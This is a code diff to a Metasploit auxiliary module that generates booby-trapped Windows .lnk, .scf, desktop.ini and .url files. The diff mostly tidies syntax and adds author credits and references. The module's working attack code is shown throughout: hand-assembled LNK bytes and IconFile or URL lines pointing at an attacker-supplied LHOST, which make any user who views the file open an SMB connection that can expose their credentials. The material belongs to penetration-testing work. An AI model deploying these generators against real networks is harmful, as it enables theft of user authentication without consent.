@@ -16,10 +16,17 @@ class MetasploitModule < Msf::Auxiliary
           a .lnk, .scf, .url, desktop.ini file which includes a reference
           to the the specified remote host, causing SMB connections to be initiated
           from any user that views the file.
+
+          Lnk file creation code taken from module droplnk.rb by Mubix
         },
         'License'       => MSF_LICENSE,
-        'Author'        => [ 'Richard Davy - secureyourit.co.uk' ],
+        'Author'        => [ 'Richard Davy - secureyourit.co.uk, Lnk Creation Code by Mubix' ],
         'Platform'      => [ 'win' ],
+        'References'    =>
+        [
+          ['URL', 'https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018'],
+          ['URL', 'https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/']
+        ]
 
       ))
     register_options(
@@ -32,20 +39,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     if datastore['FILENAME'].chars.last(3).join=="lnk"
-        createlnk()
+        createlnk
     elsif datastore['FILENAME'].chars.last(3).join=="scf"
-        createscf()
+        createscf
     elsif datastore['FILENAME']=="desktop.ini"
-        create_desktopini()
+        create_desktopini
     elsif datastore['FILENAME'].chars.last(3).join=="url"
-        create_url()
+        create_url
     end
 
   end
 
 
-  def createlnk()
-    #Code below taken from module written by Mubix
+  def createlnk
+    #Code below taken from module droplnk.rb written by Mubix
     lnk = ""
     lnk << "\x4c\x00\x00\x00"                  #Header size
     lnk << "\x01\x14\x02\x00\x00\x00\x00\x00"  #Link CLSID
@@ -102,31 +109,31 @@ class MetasploitModule < Msf::Auxiliary
     file_create(lnk)
   end
 
-  def createscf()
+  def createscf
     scf=""
     scf << "[Shell]\n"
     scf << "Command=2\n"
-    scf << "IconFile=\\\\"+datastore['LHOST']+"\\test.ico\n"
+    scf << "IconFile=\\\\#{datastore['LHOST']}\\test.ico\n"
     scf << "[Taskbar]\n"
     scf << "Command=ToggleDesktop"
 
     file_create(scf)
   end
 
-  def create_desktopini()
+  def create_desktopini
     ini=""
     ini << "[.ShellClassInfo]\n"
-    ini << "IconFile=\\\\"+datastore['LHOST']+"\\icon.ico\n"
+    ini << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
     ini << "IconIndex=1337"
 
     file_create(ini)
 
   end
 
-  def create_url()
+  def create_url
     url=""
     url << "[InternetShortcut]\n"
-    url << "URL=file://"+datastore['LHOST']+"/url.html"
+    url << "URL=file://#{datastore['LHOST']}/url.html"
 
     file_create(url)
   end
